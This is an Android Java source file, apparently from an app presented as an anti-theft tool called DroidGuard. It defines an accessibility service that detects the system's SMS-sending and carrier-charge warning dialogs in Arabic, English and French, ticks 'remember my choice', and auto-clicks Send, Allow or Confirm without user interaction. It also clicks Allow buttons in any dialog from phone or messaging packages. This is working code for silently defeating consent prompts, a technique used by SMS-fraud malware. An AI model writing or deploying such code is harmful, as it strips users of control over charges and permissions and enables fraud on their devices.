package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

/**
 * DroidGuard Auto-Confirm Accessibility Service
 * Automatically detects the Android OS "سيرسل رسالة SMS" (Send SMS confirmation / rate limit)
 * dialog and clicks the positive "إرسال" (Send) button instantly without user interaction.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null && event != null) {
            rootNode = event.getSource();
        }
        if (rootNode == null) return;

        try {
            CharSequence pkgName = event != null ? event.getPackageName() : null;
            String pkgStr = pkgName != null ? pkgName.toString().toLowerCase() : "";

            // Known dialog packages (Android OS framework, Telephony, OEM confirmation dialogues)
            boolean isSystemOrTelecomPkg = pkgStr.contains("android") || 
                                           pkgStr.contains("telephony") || 
                                           pkgStr.contains("phone") || 
                                           pkgStr.contains("mms") || 
                                           pkgStr.contains("messaging");

            boolean isSmsWarningDialog = false;

            // 1. Search for keywords in Arabic, English, and French indicating SMS confirmation or charge alert
            String[] warningKeywords = new String[] {
                "سيرسل رسالة SMS",
                "سيرسل رسالة",
                "رسالة SMS",
                "رسالة قصيرة",
                "فرض رسوم",
                "رسوم إضافية",
                "قد يتسبب",
                "قد يؤدي هذا إلى فرض رسوم",
                "Anti-Theft",
                "DroidGuard",
                "send an SMS",
                "sending an SMS",
                "cause charges",
                "carrier charges",
                "enverra un SMS",
                "envoyer un SMS"
            };

            for (String kw : warningKeywords) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    isSmsWarningDialog = true;
                    Log.i(TAG, "Detected SMS confirmation dialog via keyword: " + kw);
                    break;
                }
            }

            // 2. If it's the SMS dialog OR if it's an OS dialog with an "إرسال" / "Send" positive button
            if (isSmsWarningDialog || isSystemOrTelecomPkg) {
                // If there's a "Remember my choice" / "تذكر خياري" / "عدم السؤال مرة أخرى" checkbox, select it first
                try {
                    String[] checkIds = new String[] { "android:id/check", "android:id/checkbox" };
                    for (String cid : checkIds) {
                        List<AccessibilityNodeInfo> checkboxes = rootNode.findAccessibilityNodeInfosByViewId(cid);
                        if (checkboxes != null) {
                            for (AccessibilityNodeInfo cb : checkboxes) {
                                if (cb.isCheckable() && !cb.isChecked()) {
                                    cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    Log.i(TAG, "Checked 'Remember my choice' option.");
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {}

                // Priority 1: Check text for "إرسال" / "Send" / "السماح" buttons
                String[] sendTexts = new String[] { "إرسال", "ارسال", "Send", "Envoyer", "السماح", "Allow", "سماح", "تأكيد" };
                for (String sendText : sendTexts) {
                    List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(sendText);
                    if (buttons != null && !buttons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : buttons) {
                            if (clickNodeOrParent(btn)) {
                                Log.i(TAG, "Auto-clicked send button via text '" + sendText + "' successfully!");
                                return;
                            }
                        }
                    }
                }

                // Priority 2: Find standard Android positive button (button1) if confirmed dialog
                if (isSmsWarningDialog) {
                    List<AccessibilityNodeInfo> positiveButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1");
                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : positiveButtons) {
                            if (clickNodeOrParent(btn)) {
                                Log.i(TAG, "Auto-clicked positive button1 (Send SMS) successfully!");
                                return;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            if (parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo grandParent = parent.getParent();
            if (grandParent != null && grandParent.isClickable()) {
                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
